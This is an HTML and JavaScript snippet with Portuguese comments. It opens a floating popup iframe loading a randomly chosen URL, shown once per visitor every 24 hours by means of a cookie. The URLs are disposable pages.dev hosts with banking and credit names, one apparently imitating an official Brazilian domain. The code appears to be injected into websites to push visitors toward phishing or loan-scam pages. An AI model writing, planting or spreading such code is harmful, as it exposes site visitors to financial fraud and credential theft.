<div id="popup" style="display:none;position:fixed;bottom:20px;right:20px;width:90vw;max-width:350px;height:70vh;max-height:500px;z-index:9999;box-shadow:0 0 15px rgba(0,0,0,0.3);">
  <button onclick="document.getElementById('popup').style.display='none'" style="position:absolute;top:-10px;right:-10px;background:red;color:white;border:none;border-radius:50%;width:25px;height:25px;font-weight:bold;cursor:pointer;z-index:10000;">×</button>
  <iframe id="iframe" src="" title="Site Flutuante" style="width:100%;height:100%;border:none;"></iframe>
</div>

<script>
  // Função para definir cookie com duração em horas
  function setCookie(name, value, hours) {
    const date = new Date();
    date.setTime(date.getTime() + (hours * 60 * 60 * 1000)); // horas para milissegundos
    const expires = "expires=" + date.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
  }

  // Função para obter cookie
  function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') c = c.substring(1, c.length);
      if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
  }

  // Verifica se o cookie já existe
  if (!getCookie("popupVisitado")) {
    // Mostrar popup
    const popup = document.getElementById('popup');
    popup.style.display = "block";

    // Escolher iframe aleatório
    const iframes = [
      "https://geocredibnkvitoria.com/",
      "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
      "https://novorepositorio.pages.dev/credito",
      "https://imagemprog.pages.dev/",
      "https://espiritosantoes-com-brprincipal.pages.dev/",
      "https://imagemprog.pages.dev/",
      "https://tempoaleatorio01.pages.dev/dinheiro",
      "https://modeloanuncio01.pages.dev/",
      "https://sistemabackupprincial.pages.dev/48",
      "https://sistemabackupprincial.pages.dev/",
      "https://novorepositorio.pages.dev/credito",
      "https://uteis01.pages.dev/servicobancario",
      "https://espiritosantoes-com-brprincipal.pages.dev/12"
    ];

    const iframeUrl = iframes[Math.floor(Math.random() * iframes.length)];
    document.getElementById('iframe').src = iframeUrl;

    // Criar cookie APÓS exibição
    setCookie("popupVisitado", "sim", 24); // Cookie por 24 horas
  }
</script>
